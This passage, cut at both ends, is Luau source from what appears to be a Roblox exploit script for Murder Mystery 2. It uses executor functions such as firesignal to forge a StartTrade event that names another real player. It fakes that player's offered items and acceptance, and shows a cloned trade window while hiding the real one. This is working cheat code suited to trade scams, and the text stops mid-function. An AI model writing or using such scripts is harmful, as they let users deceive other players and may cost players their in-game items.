					if Trade.offerState[sn] ~= nil and not slot.Visible then task.wait(); Trade.enforceSlot(sn)
					elseif Trade.offerState[sn] == nil and slot.Visible then task.wait(); Trade.enforceSlot(sn) end
				end))
				local sc = slot:FindFirstChild("Container")
				if sc then
					local icon = sc:FindFirstChild("Icon")
					if icon then table.insert(Trade.propertyConnections, icon:GetPropertyChangedSignal("Image"):Connect(function()
						if Trade.offerState[sn] and icon.Image ~= Trade.offerState[sn].icon then task.wait(); Trade.enforceSlot(sn) end
					end)) end
					local amt = sc:FindFirstChild("Amount")
					if amt then table.insert(Trade.propertyConnections, amt:GetPropertyChangedSignal("Text"):Connect(function()
						if Trade.offerState[sn] then local exp = Trade.fmtOffer(Trade.offerState[sn].amount); if amt.Text ~= exp then task.wait(); Trade.enforceSlot(sn) end end
					end)) end
				end
				local sin = slot:FindFirstChild("ItemName")
				if sin then
					local nl = sin:FindFirstChild("Label")
					if nl then table.insert(Trade.propertyConnections, nl:GetPropertyChangedSignal("Text"):Connect(function()
						if Trade.offerState[sn] then
							local expected = tostring(Trade.offerState[sn].displayName or Trade.offerState[sn].name)
							if nl.Text ~= expected then task.wait(); Trade.enforceSlot(sn) end
						end
					end)) end
				end
			end
		end
	end
	local tc = Trade.getTheirC()
	if tc then
		for i = 1, 4 do
			local sn = "NewItem" .. i; local slot = tc:FindFirstChild(sn)
			if slot then
				table.insert(Trade.propertyConnections, slot:GetPropertyChangedSignal("Visible"):Connect(function()
					if Trade.theirState[sn] ~= nil and not slot.Visible then task.wait(); Trade.enforceTheirSlot(sn)
					elseif Trade.theirState[sn] == nil and slot.Visible then task.wait(); Trade.enforceTheirSlot(sn) end
				end))
				local sc = slot:FindFirstChild("Container")
				if sc then
					local icon = sc:FindFirstChild("Icon")
					if icon then table.insert(Trade.propertyConnections, icon:GetPropertyChangedSignal("Image"):Connect(function()
						if Trade.theirState[sn] and icon.Image ~= Trade.theirState[sn].icon then task.wait(); Trade.enforceTheirSlot(sn) end
					end)) end
					local amt = sc:FindFirstChild("Amount")
					if amt then table.insert(Trade.propertyConnections, amt:GetPropertyChangedSignal("Text"):Connect(function()
						if Trade.theirState[sn] then local exp = Trade.fmtOffer(Trade.theirState[sn].amount); if amt.Text ~= exp then task.wait(); Trade.enforceTheirSlot(sn) end end
					end)) end
				end
				local sin = slot:FindFirstChild("ItemName")
				if sin then
					local nl = sin:FindFirstChild("Label")
					if nl then table.insert(Trade.propertyConnections, nl:GetPropertyChangedSignal("Text"):Connect(function()
						if Trade.theirState[sn] then
							local expected = tostring(Trade.theirState[sn].displayName or Trade.theirState[sn].name)
							if nl.Text ~= expected then task.wait(); Trade.enforceTheirSlot(sn) end
						end
					end)) end
				end
			end
		end
	end
end

function Trade.setupSourceWatchers()
	for _, c in ipairs(Trade.sourcePropConnections) do c:Disconnect() end
	Trade.sourcePropConnections = {}
	local wc = Trade.getWeaponC(); if not wc then return end
	for _, ch in ipairs(wc:GetChildren()) do
		if ch.Name == "NewItem" then
			local cc = ch:FindFirstChild("Container")
			local ci = ch:FindFirstChild("ItemName")
			if cc and ci then
				local nl = ci:FindFirstChild("Label")
				local al = cc:FindFirstChild("Amount")
				if nl then
					local iName = tostring(nl.Text)
					if al and al:IsA("TextLabel") then
						table.insert(Trade.sourcePropConnections, al:GetPropertyChangedSignal("Text"):Connect(function()
							local st = Trade.sourceState[iName]
							if not st then return end
							local exp = Trade.fmtSource(st.currentAmount)
							if al.Text ~= exp then task.wait(); Trade.applySourceState(iName) end
						end))
					end
					table.insert(Trade.sourcePropConnections, ch:GetPropertyChangedSignal("Visible"):Connect(function()
						local st = Trade.sourceState[iName]
						if not st then return end
						local expectedVisible = Trade.sourceShouldBeVisible(ch, st.currentAmount)
						if ch.Visible ~= expectedVisible then task.wait(); ch.Visible = expectedVisible end
					end))
				end
			end
		end
	end
end

function Trade.findSlotByKey(key) for i = 1, 4 do local s = "NewItem" .. i; if Trade.offerState[s] and Trade.offerState[s].name == key then return s end end; return nil end
function Trade.findEmpty() for i = 1, 4 do local s = "NewItem" .. i; if Trade.offerState[s] == nil then return s end end; return nil end
function Trade.findTheirSlot(n) for i = 1, 4 do local s = "NewItem" .. i; if Trade.theirState[s] and Trade.theirState[s].name == n then return s end end; return nil end
function Trade.findTheirEmpty() for i = 1, 4 do local s = "NewItem" .. i; if Trade.theirState[s] == nil then return s end end; return nil end

function Trade.endSession()
	Trade.inSession = false
	Trade.enabled = false
	Trade.isIncoming = false
	Core.tradeSessionActive = false
	Trade.stopCooldown()
	if Trade.searchConn then Trade.searchConn:Disconnect(); Trade.searchConn = nil end
	if Trade.theirThread then task.cancel(Trade.theirThread); Trade.theirThread = nil end
end

function Trade.showClaim()
	local nif = Trade.getClaimNI(); if not nif then return end
	if Trade.claimIndex > Trade.claimTotal or #Trade.claimQueue == 0 then nif.Visible = false; Trade.endSession(); return end
	local ci = Trade.claimQueue[Trade.claimIndex]; if not ci then nif.Visible = false; Trade.endSession(); return end
	local oc = nif:FindFirstChild("Container"); if not oc then return end
	local ini = oc:FindFirstChild("NewItem"); if not ini then return end
	local inc = ini:FindFirstChild("Container"); local iin = ini:FindFirstChild("ItemName")
	if inc then
		local icon = inc:FindFirstChild("Icon"); local amt = inc:FindFirstChild("Amount")
		if icon then icon.Image = ci.icon or "" end
		if amt and amt:IsA("TextLabel") then if ci.amount > 1 then amt.Text = "x" .. ci.amount else amt.Text = "" end end
	end
	if iin then
		local lbl = iin:FindFirstChild("Label"); if lbl then lbl.Text = tostring(ci.displayName or ci.name) end
		pcall(function() iin.BackgroundColor3 = ci.color end)
	end
	local sb = oc:FindFirstChild("Starburst")
	if sb then pcall(function() sb.ImageColor3 = ci.color; sb.BackgroundColor3 = ci.color end) end
	local cb = oc:FindFirstChild("Claim")
	if cb then
		local ct
		if cb:IsA("TextButton") or cb:IsA("TextLabel") then ct = cb
		else for _, c in ipairs(cb:GetDescendants()) do if c:IsA("TextLabel") or c:IsA("TextButton") then ct = c; break end end end
		if ct then if Trade.claimTotal > 1 then ct.Text = "Claim (" .. Trade.claimIndex .. "/" .. Trade.claimTotal .. ")" else ct.Text = "Claim" end end
	end
	nif.Visible = true
end

function Trade.handleClaim()
	local ci = Trade.claimQueue[Trade.claimIndex]
	if ci and ci.itemData then Trade.addToInventory(ci.itemData, ci.amount) end
	local nif = Trade.getClaimNI()
	local slideImage = nil
	if nif then
		local oc = nif:FindFirstChild("Container")
		if oc then
			local ini = oc:FindFirstChild("NewItem")
			if ini then
				local inc = ini:FindFirstChild("Container")
				if inc then
					local icon = inc:FindFirstChild("Icon")
					if icon and icon.Image ~= "" then
						slideImage = Instance.new("ImageLabel", nif)
						slideImage.BackgroundTransparency = 1
						slideImage.Image = icon.Image
						slideImage.ScaleType = Enum.ScaleType.Fit
						slideImage.Size = UDim2.new(0, 100, 0, 100)
						slideImage.AnchorPoint = Vector2.new(0.5, 0.5)
						slideImage.Position = UDim2.new(0.5, 0, 0.4, 0)
						slideImage.ZIndex = 50
					end
				end
			end
		end
	end
	local lastItem = (Trade.claimIndex == Trade.claimTotal)
	Trade.claimIndex = Trade.claimIndex + 1
	if lastItem then
		if nif then nif.Visible = false end
		if slideImage then
			local slideTween = TweenService:Create(slideImage, TweenInfo.new(0.5, Enum.EasingStyle.Quad, Enum.EasingDirection.In), {Position = UDim2.new(-0.5, 0, 0.4, 0), ImageTransparency = 0.8, Size = UDim2.new(0, 60, 0, 60)})
			slideTween:Play()
			slideTween.Completed:Connect(function() slideImage:Destroy() end)
		end
		task.wait(0.3)
		Trade.claimQueue = {}; Trade.claimIndex = 0; Trade.claimTotal = 0
		Trade.endSession()
	else
		Trade.showClaim()
		if slideImage then
			local slideTween = TweenService:Create(slideImage, TweenInfo.new(0.5, Enum.EasingStyle.Quad, Enum.EasingDirection.In), {Position = UDim2.new(-0.5, 0, 0.4, 0), ImageTransparency = 0.8, Size = UDim2.new(0, 60, 0, 60)})
			slideTween:Play()
			slideTween.Completed:Connect(function() slideImage:Destroy() end)
		end
	end
end

function Trade.connectClaim()
	if Trade.claimC then Trade.claimC:Disconnect(); Trade.claimC = nil end
	local nif = Trade.getClaimNI(); if not nif then return end
	local oc = nif:FindFirstChild("Container"); if not oc then return end
	local cb = oc:FindFirstChild("Claim"); if not cb then return end
	if cb:IsA("TextButton") or cb:IsA("ImageButton") then Trade.claimC = cb.MouseButton1Click:Connect(Trade.handleClaim); return end
	for _, c in ipairs(cb:GetDescendants()) do if c:IsA("TextButton") or c:IsA("ImageButton") then Trade.claimC = c.MouseButton1Click:Connect(Trade.handleClaim); return end end
end

function Trade.startClaim()
	Trade.claimQueue = {}
	for i = 1, 4 do
		local sn = "NewItem" .. i; local st = Trade.theirState[sn]
		if st and st.itemData then
			table.insert(Trade.claimQueue, {
				name = st.name, displayName = st.displayName or st.name,
				icon = st.icon, amount = st.amount, color = st.color, itemData = st.itemData
			})
		end
	end
	Trade.claimTotal = #Trade.claimQueue; Trade.claimIndex = 1
	if Trade.claimTotal == 0 then Trade.endSession(); return end
	Trade.connectClaim(); Trade.showClaim()
end

function Trade.runCompletion()
	local t = getActiveTradeGUI(); if not t then return end
	local c = t:FindFirstChild("Container"); local p = t:FindFirstChild("Processing")
	if c then c.Visible = false end; if p then p.Visible = true end
	task.wait(1.5)
	if p then p.Visible = false end
	t.Enabled = false
	if c then c.Visible = true end
	if Trade.isIncoming then
		local snap = {}
		for i = 1, 4 do local sn = "NewItem" .. i; if Trade.theirState[sn] then snap[sn] = Trade.theirState[sn] end end
		for i = 1, 4 do Trade.offerState["NewItem" .. i] = nil; Trade.theirState["NewItem" .. i] = nil; Trade.applySlot("NewItem" .. i); Trade.applyTheirSlot("NewItem" .. i) end
		for k, v in pairs(snap) do Trade.theirState[k] = v end
		local ya = Trade.getYourAcc(); local ta = Trade.getTheirAcc()
		if ya then ya.Visible = false end; if ta then ta.Visible = false end
		local ai = Trade.getAddItemF(); if ai then ai.Visible = true end
		local cd = Trade.getCooldownF(); if cd then cd.Visible = false end
		local cf = Trade.getConfirmF(); if cf then cf.Visible = false end
		local cxl = Trade.getCancelF(); if cxl then cxl.Visible = false end
		Trade.resetConfirm(); Trade.theyAccepted = false
		Trade.startClaim()
		for i = 1, 4 do Trade.theirState["NewItem" .. i] = nil end
		return
	end
	for i = 1, 4 do Trade.offerState["NewItem" .. i] = nil; Trade.theirState["NewItem" .. i] = nil; Trade.applySlot("NewItem" .. i); Trade.applyTheirSlot("NewItem" .. i) end
	local ya = Trade.getYourAcc(); local ta = Trade.getTheirAcc()
	if ya then ya.Visible = false end; if ta then ta.Visible = false end
	local ai = Trade.getAddItemF(); if ai then ai.Visible = true end
	local cd = Trade.getCooldownF(); if cd then cd.Visible = false end
	local cf = Trade.getConfirmF(); if cf then cf.Visible = false end
	local cxl = Trade.getCancelF(); if cxl then cxl.Visible = false end
	Trade.resetConfirm(); Trade.theyAccepted = false; Trade.endSession()
end

function Trade.declineIt()
	if not Trade.enabled then return end
	Trade.stopCooldown(); Trade.restoreAllSources()
	if Trade.theirThread then task.cancel(Trade.theirThread); Trade.theirThread = nil end
	for i = 1, 4 do Trade.offerState["NewItem" .. i] = nil; Trade.theirState["NewItem" .. i] = nil; Trade.applySlot("NewItem" .. i); Trade.applyTheirSlot("NewItem" .. i) end
	local ya = Trade.getYourAcc(); if ya then ya.Visible = false end
	local ta = Trade.getTheirAcc(); if ta then ta.Visible = false end
	local cd = Trade.getCooldownF(); if cd then cd.Visible = false end
	local cf = Trade.getConfirmF(); if cf then cf.Visible = false end
	local cxl = Trade.getCancelF(); if cxl then cxl.Visible = false end
	local ai = Trade.getAddItemF(); if ai then ai.Visible = true end
	Trade.resetConfirm(); Trade.theyAccepted = false; Trade.endSession()
	local t = getActiveTradeGUI(); if t then t.Enabled = false end
end

function Trade.simulateOther()
	if Trade.theirThread then task.cancel(Trade.theirThread); Trade.theirThread = nil end
	Trade.theirThread = task.spawn(function()
		task.wait(1.5)
		local ni = math.random(1, 4); local picked = {}
		for i = 1, ni do
			if not Trade.scriptAlive or not Trade.enabled or not Trade.isIncoming then return end
			task.wait(math.random(1, 2))
			if #Trade.allowedItems == 0 then return end
			local itemData
			if #picked > 0 and math.random(1, 100) <= 30 then itemData = picked[math.random(1, #picked)]
			else
				local at = 0
				repeat
					local pick = Trade.allowedItems[math.random(1, #Trade.allowedItems)]
					if pick then itemData = pick.data end
					at = at + 1
				until (itemData and not Trade.isIgnored(itemData.ItemName)) or at >= 15
				if not itemData or Trade.isIgnored(itemData.ItemName) then continue end
				table.insert(picked, itemData)
			end
			local color = Core.rarityColors[itemData.Rarity] or Color3.fromRGB(180, 180, 180)
			local es = Trade.findTheirSlot(itemData.ItemName)
			if es then Trade.theirState[es].amount = Trade.theirState[es].amount + 1; Trade.applyTheirSlot(es)
			else
				local em = Trade.findTheirEmpty(); if not em then break end
				Trade.theirState[em] = {
					name = itemData.ItemName, displayName = itemData.ItemName,
					icon = itemData.Image or "", amount = 1,
					color = color, transparency = 0, itemData = itemData,
					isFX = (itemData.FX == true), isChroma = (itemData.Chroma == true)
				}
				Trade.applyTheirSlot(em)
			end
			Trade.updateAcceptUI()
		end
		while Trade.cdActive do task.wait(0.3); if not Trade.scriptAlive or not Trade.enabled or not Trade.isIncoming then return end end
		task.wait(math.random(1, 3))
		if not Trade.scriptAlive or not Trade.enabled or not Trade.isIncoming then return end
		local ta = Trade.getTheirAcc(); if ta then ta.Visible = true; Trade.theyAccepted = true end
	end)
end

function Trade.connectConfirm()
	if Trade.confirmC then Trade.confirmC:Disconnect() end
	local cf = Trade.getConfirmF(); if not cf then return end
	local ab = cf:FindFirstChild("ActionButton")
	if ab and ab:IsA("TextButton") then
		Trade.confirmC = ab.MouseButton1Click:Connect(function()
			if not Trade.scriptAlive or not Trade.enabled then return end
			if Trade.cdActive then return end
			if Trade.tradeAccepted then
				Trade.tradeAccepted = false; Trade.areYouSure = false
				local ya = Trade.getYourAcc(); if ya then ya.Visible = false end
				if not Trade.isIncoming then local ta = Trade.getTheirAcc(); if ta then ta.Visible = false end end
				local cxl = Trade.getCancelF(); if cxl then cxl.Visible = false end
				Trade.setConfirmText("Accept"); Trade.startCooldown(); return
			end
			if not Trade.areYouSure then Trade.areYouSure = true; Trade.setConfirmText("ARE YOU SURE?")
			else
				Trade.areYouSure = false; Trade.tradeAccepted = true
				local ca = Trade.getCancelF(); if ca then ca.Visible = true end
				local ya = Trade.getYourAcc(); if ya then ya.Visible = true end
				task.wait(0.5)
				if not Trade.isIncoming then local ta = Trade.getTheirAcc(); if ta then ta.Visible = true end end
				task.wait(2)
				if Trade.tradeAccepted then
					if Trade.isIncoming and not Trade.theyAccepted then
						local wt = 0
						while not Trade.theyAccepted and wt < 15 and Trade.tradeAccepted do task.wait(0.5); wt = wt + 0.5 end
						if not Trade.theyAccepted then return end
					end
					Trade.runCompletion()
				end
			end
		end)
	end
end

function Trade.connectCancel()
	if Trade.cancelC then Trade.cancelC:Disconnect() end
	local cf = Trade.getCancelF(); if not cf then return end
	local ab = cf:FindFirstChild("ActionButton")
	if not ab then for _, ch in ipairs(cf:GetDescendants()) do if ch:IsA("TextButton") then ab = ch; break end end end
	if ab and ab:IsA("TextButton") then
		Trade.cancelC = ab.MouseButton1Click:Connect(function()
			if not Trade.scriptAlive or not Trade.enabled then return end
			Trade.areYouSure = false; Trade.tradeAccepted = false; Trade.setConfirmText("Accept")
			local ca = Trade.getCancelF(); if ca then ca.Visible = false end
			local ya = Trade.getYourAcc(); if ya then ya.Visible = false end
			Trade.startCooldown()
		end)
	end
end

function Trade.connectDecline()
	if Trade.declineC then Trade.declineC:Disconnect() end
	local df = Trade.getDeclineF(); if not df then return end
	local ab = df:FindFirstChild("ActionButton")
	if not ab then for _, ch in ipairs(df:GetDescendants()) do if ch:IsA("TextButton") then ab = ch; break end end end
	if ab and ab:IsA("TextButton") then
		Trade.declineC = ab.MouseButton1Click:Connect(function()
			if not Trade.scriptAlive or not Trade.enabled then return end
			Trade.declineIt()
		end)
	end
end

function Trade.handleSourceClick(sni)
	if not Trade.scriptAlive or not Trade.enabled then return end
	local now = tick(); if now - Trade.lastClick < 0.15 then return end; Trade.lastClick = now
	local sc = sni:FindFirstChild("Container"); local sin = sni:FindFirstChild("ItemName")
	if not sc or not sin then return end
	local snl = sin:FindFirstChild("Label"); local si = sc:FindFirstChild("Icon")
	if not snl or not si then return end
	local iName = tostring(snl.Text)
	if iName == "Default Knife" or iName == "Default Gun" then return end
	Trade.registerSource(sni)
	local sd = Trade.sourceState[iName]; if not sd then return end
	if sd.currentAmount <= 0 then return end
	local itemData = Core.getItemDataByName(iName)
	local tagFrame = sni:FindFirstChild("Tags")
	local isFX = false
	local isChroma = false
	if itemData then
		isFX = (itemData.FX == true)
		isChroma = (itemData.Chroma == true)
	end
	if not isFX and not isChroma and tagFrame then
		local f = tagFrame:FindFirstChild("FX"); if f and f.Visible then isFX = true end
		local c = tagFrame:FindFirstChild("Chroma"); if c and c.Visible then isChroma = true end
	end
	local slotKey = iName
	if isFX then slotKey = iName .. "_FX"
	elseif isChroma then slotKey = iName .. "_Chroma" end
	local es = Trade.findSlotByKey(slotKey)
	if es then
		Trade.offerState[es].amount = Trade.offerState[es].amount + 1
		Trade.applySlot(es)
	else
		local em = Trade.findEmpty(); if not em then return end
		local color = Color3.fromRGB(60, 60, 60); local trans = 0
		pcall(function() if sin:IsA("Frame") or sin:IsA("TextLabel") or sin:IsA("ImageLabel") then color = sin.BackgroundColor3; trans = sin.BackgroundTransparency end end)
		Trade.offerState[em] = {
			name = slotKey, displayName = iName,
			icon = si.Image, amount = 1,
			color = color, transparency = trans,
			isFX = isFX, isChroma = isChroma
		}
		Trade.applySlot(em)
	end
	sd.currentAmount = sd.currentAmount - 1
	Trade.updateSource(iName)
	Trade.updateAcceptUI()
	Trade.clearSearchBox()
end

_G.handleSourceActionClickRef = function(sni) Trade.handleSourceClick(sni) end

function Trade.handleOfferClick(os)
	if not Trade.scriptAlive or not Trade.enabled then return end
	local now = tick(); if now - Trade.lastClick < 0.15 then return end; Trade.lastClick = now
	local sn = os.Name; local st = Trade.offerState[sn]; if not st then return end
	local iName = st.displayName or st.name
	local sd = Trade.sourceState[iName]
	if sd then sd.currentAmount = sd.currentAmount + 1; Trade.updateSource(iName) end
	if st.amount <= 1 then Trade.offerState[sn] = nil; Trade.applySlot(sn)
	else st.amount = st.amount - 1; Trade.applySlot(sn) end
	Trade.updateAcceptUI()
end

function Trade.connectOffers()
	if not Trade.scriptAlive then return end
	for _, c in ipairs(Trade.offerConnections) do c:Disconnect() end
	Trade.offerConnections = {}
	local oc = Trade.getOfferC(); if not oc then return end
	for i = 1, 4 do
		local slot = oc:FindFirstChild("NewItem" .. i)
		if slot then
			local sc = slot:FindFirstChild("Container")
			if sc then
				local ab = sc:FindFirstChild("ActionButton")
				if ab and ab:IsA("TextButton") then
					table.insert(Trade.offerConnections, ab.MouseButton1Click:Connect(function() Trade.handleOfferClick(slot) end))
				end
			end
		end
	end
end

function Trade.connectWeapons()
	if not Trade.scriptAlive then return end
	local wc = Trade.getWeaponC(); if not wc then return end
	for _, c in ipairs(Trade.connections) do c:Disconnect() end
	Trade.connections = {}
	for _, ch in ipairs(wc:GetChildren()) do
		if ch.Name == "NewItem" then
			local cc = ch:FindFirstChild("Container")
			if cc then
				local ab = cc:FindFirstChild("ActionButton")
				if ab and ab:IsA("TextButton") then
					Trade.registerSource(ch)
					table.insert(Trade.connections, ab.MouseButton1Click:Connect(function() Trade.handleSourceClick(ch) end))
				end
			end
		end
	end
	Trade.connectOffers()
	Trade.setupWatchers()
	Trade.setupSourceWatchers()
	Trade.connectSearch()
	Trade.connectConfirm()
	Trade.connectCancel()
	Trade.connectDecline()
end

local function fireStartTradeSignal()
	if autoTraderActive then return end
	pcall(function()
		local fakePlr = localPlayer
		for _, plr in ipairs(Players:GetPlayers()) do
			if plr ~= localPlayer then fakePlr = plr; break end
		end
		if firesignal then
			local event = ReplicatedStorage:FindFirstChild("Trade") and ReplicatedStorage.Trade:FindFirstChild("StartTrade")
			if event then
				firesignal(event.OnClientEvent,
					{Locked = false, LastOffer = tick(),
					Player2 = {Player = fakePlr, Offer = {}, Accepted = false},
					Player1 = {Player = localPlayer, Offer = {}, Accepted = false}},
					fakePlr.Name)
			end
		end
	end)
end

local function clearCloneOfferSlots()
	if not clonedTradeGUI then return end
	pcall(function()
		local c = clonedTradeGUI:FindFirstChild("Container"); if not c then return end
		local tr = c:FindFirstChild("Trade"); if not tr then return end
		local yo = tr:FindFirstChild("YourOffer")
		if yo then
			local yoc = yo:FindFirstChild("Container")
			if yoc then
				for i = 1, 4 do
					local slot = yoc:FindFirstChild("NewItem" .. i)
					if slot then
						slot.Visible = false
						local sc = slot:FindFirstChild("Container")
						if sc then
							local icon = sc:FindFirstChild("Icon"); if icon then icon.Image = "" end
							local amt = sc:FindFirstChild("Amount"); if amt and amt:IsA("TextLabel") then amt.Text = "..." end
						end
						local sin = slot:FindFirstChild("ItemName")
						if sin then local nl = sin:FindFirstChild("Label"); if nl then nl.Text = " " end end
					end
				end
			end
		end
		local to = tr:FindFirstChild("TheirOffer")
		if to then
			local toc = to:FindFirstChild("Container")
			if toc then
				for i = 1, 4 do
					local slot = toc:FindFirstChild("NewItem" .. i)
					if slot then
						slot.Visible = false
						local sc = slot:FindFirstChild("Container")
						if sc then
							local icon = sc:FindFirstChild("Icon"); if icon then icon.Image = "" end
							local amt = sc:FindFirstChild("Amount"); if amt and amt:IsA("TextLabel") then amt.Text = "..." end
						end
						local sin = slot:FindFirstChild("ItemName")
						if sin then local nl = sin:FindFirstChild("Label"); if nl then nl.Text = " " end end
					end
				end
			end
		end
		local actions = tr:FindFirstChild("Actions")
		if actions then
			local accept = actions:FindFirstChild("Accept")
			if accept then
				local addItem = accept:FindFirstChild("AddItem"); if addItem then addItem.Visible = true end
				local cooldown = accept:FindFirstChild("Cooldown"); if cooldown then cooldown.Visible = false end
				local confirm = accept:FindFirstChild("Confirm"); if confirm then confirm.Visible = false end
				local cancel = accept:FindFirstChild("Cancel"); if cancel then cancel.Visible = false end
			end
		end
		local yourAcc = yo and yo:FindFirstChild("Accepted"); if yourAcc then yourAcc.Visible = false end
		local theirAcc = to and to:FindFirstChild("Accepted"); if theirAcc then theirAcc.Visible = false end
	end)
end

function Trade.startSession(incoming)
	if Core.tradeSessionActive then return end
	Core.tradeSessionActive = true
	Trade.inSession = true; Trade.enabled = true; Trade.isIncoming = incoming; Trade.theyAccepted = false
	Trade.currentUsername = Trade.getSmartUsername(incoming)
	Trade.lastSessionType = incoming and "T" or "Q"

	if autoTraderActive then
		if clonedTradeGUI and clonedTradeGUI.Parent then
			clearCloneOfferSlots()
			clonedTradeGUI.Enabled = true
			local cloneContainer = clonedTradeGUI:FindFirstChild("Container")
			if cloneContainer then cloneContainer.Visible = true end
		else
			local tradeGUI = playerGui:FindFirstChild("TradeGUI")
			if tradeGUI then
				if not positionsSaved then
					for _, child in ipairs(tradeGUI:GetChildren()) do
						if child:IsA("GuiObject") and child.Position.X.Offset < 50000 then
							savedOriginalPositions[child.Name] = child.Position
						end
					end
					positionsSaved = true
				end
				clonedTradeGUI = tradeGUI:Clone()
				clonedTradeGUI.Name = "TradeGUI_Clone"
				clonedTradeGUI.Parent = playerGui
				for _, child in ipairs(clonedTradeGUI:GetChildren()) do
					if child:IsA("GuiObject") then
						pcall(function()
							if savedOriginalPositions[child.Name] then child.Position = savedOriginalPositions[child.Name] end
						end)
					end
				end
				clearCloneOfferSlots()
				clonedTradeGUI.Enabled = true
				local cloneContainer = clonedTradeGUI:FindFirstChild("Container")
				if cloneContainer then cloneContainer.Visible = true end
				hideRealTradeGUI()
			end
		end
	else
		local tradeGUI = playerGui:FindFirstChild("TradeGUI")
		if tradeGUI and not positionsSaved then
			for _, child in ipairs(tradeGUI:GetChildren()) do
				if child:IsA("GuiObject") and child.Position.X.Offset < 50000 then
					savedOriginalPositions[child.Name] = child.Position
				end
			end
			positionsSaved = true
		end
		fireStartTradeSignal()
		task.wait(0.5)
		local t = getActiveTradeGUI()
		if t then
			t.Enabled = true
			local c = t:FindFirstChild("Container"); if c then c.Visible = true end
		end
	end
	local t = getActiveTradeGUI()
	if t then
		t.Enabled = true
		local c = t:FindFirstChild("Container"); if c then c.Visible = true end
	end
	Trade.setTheirUsername(Trade.currentUsername); Trade.resetConfirm()
	local ai = Trade.getAddItemF(); if ai then ai.Visible = true end
	local cd = Trade.getCooldownF(); if cd then cd.Visible = false end
	local cf = Trade.getConfirmF(); if cf then cf.Visible = false end
	local cxl = Trade.getCancelF(); if cxl then cxl.Visible = false end
	local ya = Trade.getYourAcc(); if ya then ya.Visible = false end
	local ta = Trade.getTheirAcc(); if ta then ta.Visible = false end
	for i = 1, 4 do Trade.offerState["NewItem" .. i] = nil; Trade.theirState["NewItem" .. i] = nil end
	local tc = Trade.getTheirC()
	if tc then for i = 1, 4 do local s = tc:FindFirstChild("NewItem" .. i); if s then s.Visible = false end end end
	Trade.setTheirSlotsTrans(); task.wait(0.3); Trade.connectWeapons(); Trade.setTheirSlotsTrans()
	if incoming then Trade.simulateOther() end
end

task.spawn(function() task.wait(0.5); Core.populateSpawner() end)

if isDelta then
	local mobileBtnGui = Instance.new("ScreenGui")
	mobileBtnGui.Name = "MobileTradeBtns"
	mobileBtnGui.ResetOnSpawn = false
	mobileBtnGui.DisplayOrder = 999
	pcall(function()
		if syn and syn.protect_gui then syn.protect_gui(mobileBtnGui) end
		if gethui then mobileBtnGui.Parent = gethui() else mobileBtnGui.Parent = CoreGui end
	end)
	if not mobileBtnGui.Parent then mobileBtnGui.Parent = playerGui end

	local mobileContainer = Instance.new("Frame", mobileBtnGui)
	mobileContainer.Name = "MobileContainer"
	mobileContainer.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
	mobileContainer.BackgroundTransparency = 0.3
	mobileContainer.Size = UDim2.new(0, 130, 0, 120)
	mobileContainer.Position = UDim2.new(0, 10, 0.5, -60)
	mobileContainer.Active = true
	mobileContainer.BorderSizePixel = 0
	Utils.corner(mobileContainer, 10)
	Utils.stroke(mobileContainer, MM2.TabStroke, 2)

	local dragHandle = Instance.new("Frame", mobileContainer)
	dragHandle.Size = UDim2.new(1, 0, 0, 22)
	dragHandle.BackgroundColor3 = MM2.TitleBar
	dragHandle.BorderSizePixel = 0
	Utils.corner(dragHandle, 8)
	local dragLbl = Instance.new("TextLabel", dragHandle)
	dragLbl.BackgroundTransparency = 1
	dragLbl.Size = UDim2.new(1, 0, 1, 0)
	dragLbl.Text = "⠿ Trade"
	dragLbl.TextColor3 = MM2.TextWhite
	dragLbl.TextScaled = true
	dragLbl.FontFace = MM2.FontBold
	Utils.textStroke(dragLbl, 1.5)
	Utils.makeDraggable(dragHandle, mobileContainer)

	local giveFrame = Instance.new("Frame", mobileContainer)
	giveFrame.Size = UDim2.new(1, -10, 0, 40)
	giveFrame.Position = UDim2.new(0, 5, 0, 28)
	giveFrame.BackgroundColor3 = MM2.ActionBlue
	giveFrame.BorderSizePixel = 0
	Utils.corner(giveFrame, 8)
	Utils.stroke(giveFrame, MM2.ActionBlueStroke, 3)
	local giveLbl = Instance.new("TextLabel", giveFrame)
	giveLbl.BackgroundTransparency = 1
	giveLbl.Size = UDim2.new(1, 0, 1, 0)
	giveLbl.Text = "Give"
	giveLbl.TextColor3 = MM2.TextWhite
	giveLbl.TextScaled = true
	giveLbl.FontFace = MM2.FontBold
	Utils.textStroke(giveLbl, 2)
	local giveClick = Instance.new("ImageButton", giveFrame)
	giveClick.BackgroundTransparency = 1
	giveClick.Size = UDim2.new(1, 0, 1, 0)
	giveClick.ZIndex = 5
	giveClick.MouseButton1Click:Connect(function()
		if not Core.visualTradeEnabled then return end
		if Trade.inSession or Core.tradeSessionActive then return end
		if not Core.itemDatabase then Core.loadDatabase() end
		Trade.loadTradeDB()
		Trade.startSession(false)
	end)

	local getFrame = Instance.new("Frame", mobileContainer)
	getFrame.Size = UDim2.new(1, -10, 0, 40)
	getFrame.Position = UDim2.new(0, 5, 0, 74)
	getFrame.BackgroundColor3 = MM2.GreenAction
	getFrame.BorderSizePixel = 0
	Utils.corner(getFrame, 8)
	Utils.stroke(getFrame, MM2.GreenActionStroke, 3)
	local getLbl = Instance.new("TextLabel", getFrame)
	getLbl.BackgroundTransparency = 1
	getLbl.Size = UDim2.new(1, 0, 1, 0)
	getLbl.Text = "Get"
	getLbl.TextColor3 = MM2.TextWhite
	getLbl.TextScaled = true
	getLbl.FontFace = MM2.FontBold
	Utils.textStroke(getLbl, 2)
	local getClick = Instance.new("ImageButton", getFrame)
	getClick.BackgroundTransparency = 1
	getClick.Size = UDim2.new(1, 0, 1, 0)
	getClick.ZIndex = 5
	getClick.MouseButton1Click:Connect(function()
		if not Core.visualTradeEnabled then return end
		if Trade.inSession or Core.tradeSessionActive then return end
		if not Core.itemDatabase then Core.loadDatabase() end
		Trade.loadTradeDB()
		Trade.startSession(true)
	end)
end

local BlockPanel = {}
BlockPanel.ref = nil

function BlockPanel.open()
	if BlockPanel.ref and BlockPanel.ref.Parent then return end
	for _, v in pairs(CoreGui:GetChildren()) do if v.Name == "BlockPanel" then v:Destroy() end end
	for _, v in pairs(playerGui:GetChildren()) do if v.Name == "BlockPanel" then v:Destroy() end end
	local BlockGui = Instance.new("ScreenGui")
	BlockGui.Name = "BlockPanel"
	BlockGui.ResetOnSpawn = false
	BlockGui.DisplayOrder = 999
	BlockGui.IgnoreGuiInset = true
	BlockGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
	local okp = pcall(function() BlockGui.Parent = CoreGui end)
	if not okp then BlockGui.Parent = playerGui end
	pcall(function()
